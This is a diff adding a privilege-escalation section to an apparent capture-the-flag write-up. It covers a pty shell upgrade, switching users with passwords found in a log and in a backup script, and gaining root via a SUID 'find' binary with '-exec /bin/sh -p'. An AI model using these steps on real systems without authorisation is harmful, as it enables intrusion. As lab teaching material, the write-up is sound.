@@ -118,13 +118,11 @@ Aug 20 11:16:26 parrot sshd[2443]: Server listening on 0.0.0.0 port 22.
 Aug 20 11:16:26 parrot sshd[2443]: Server listening on :: port 22.
 Aug 20 11:16:35 parrot sshd[2451]: Accepted password for basterd from 10.1.1.1 port 49824 ssh2 #pass: superduperp@$$
 Aug 20 11:16:35 parrot sshd[2451]: pam_unix(sshd:session): session opened for user pentest by (uid=0)
-Aug 20 11:16:36 parrot sshd[2466]: Received disconnect from 10.10.170.50 port 49824:11: disconnected by user
-Aug 20 11:16:36 parrot sshd[2466]: Disconnected from user pentest 10.10.170.50 port 49824
+Aug 20 11:16:36 parrot sshd[2466]: Received disconnect from $IP port 49824:11: disconnected by user
+Aug 20 11:16:36 parrot sshd[2466]: Disconnected from user pentest $IP port 49824
 Aug 20 11:16:36 parrot sshd[2451]: pam_unix(sshd:session): session closed for user pentest
 Aug 20 12:24:38 parrot sshd[2443]: Received signal 15; terminating.
 ```
-
-- configuration.php
 
 
 ## 10000
@@ -141,4 +139,93 @@ Aug 20 12:24:38 parrot sshd[2443]: Received signal 15; terminating.
 |   2048 e3abe1392d95eb135516d6ce8df911e5 (RSA)
 |   256 aedef2bbb78a00702074567625c0df38 (ECDSA)
 |_  256 252583f2a7758aa046b2127004685ccb (ED25519)
+```
+
+# PrivEsc
+
+## Using creds of _log.txt_ file
+
+```bash
+$ python -c 'import pty;pty.spawn("/bin/bash")'
+www-data@Vulnerable:/var/www/html/joomla/_test$ su basterd
+su basterd
+Password: superduperp@$$
+
+basterd@Vulnerable:/var/www/html/joomla/_test$
+```
+
+## Using creds of _backup.sh_ file
+
+```bash
+basterd@Vulnerable:~$ pwd
+pwd
+/home/basterd
+basterd@Vulnerable:~$ cat backup.sh
+cat backup.sh
+REMOTE=1.2.3.4
+
+SOURCE=/home/stoner
+TARGET=/usr/local/backup
+
+LOG=/home/stoner/bck.log
+ 
+DATE=`date +%y\.%m\.%d\.`
+
+USER=stoner
+#superduperp@$$no1knows
+
+ssh $USER@$REMOTE mkdir $TARGET/$DATE
+
+
+if [ -d "$SOURCE" ]; then
+    for i in `ls $SOURCE | grep 'data'`;do
+             echo "Begining copy of" $i  >> $LOG
+             scp  $SOURCE/$i $USER@$REMOTE:$TARGET/$DATE
+             echo $i "completed" >> $LOG
+
+                if [ -n `ssh $USER@$REMOTE ls $TARGET/$DATE/$i 2>/dev/null` ];then
+                    rm $SOURCE/$i
+                    echo $i "removed" >> $LOG
+                    echo "####################" >> $LOG
+                                else
+                                        echo "Copy not complete" >> $LOG
+                                        exit 0
+                fi 
+    done
+     
+
+else
+
+    echo "Directory is not present" >> $LOG
+    exit 0
+fi	
+
+basterd@Vulnerable:~$ su stoner
+su stoner
+Password: superduperp@$$no1knows
+stoner@Vulnerable:/home/basterd$
+```
+
+## SUID permissions
+```bash
+stoner@Vulnerable:/home/basterd$ find / -perm /4000 -type f -exec ls -ld {} \; 2>/dev/null
+(...)
+-r-sr-xr-x 1 root root 232196 Feb  8  2016 /usr/bin/find
+(...)
+```
+
+## Using `find` exploit
+```
+stoner@Vulnerable:/var/www/html/joomla/_test$ find . -exec /bin/sh -p \; -quit
+<html/joomla/_test$ find . -exec /bin/sh -p \; -quit                         
+# whoami
+whoami
+root
+# cd /root
+cd /root
+# ls         
+ls
+root.txt
+# cat root.txt
+$flag
 ```
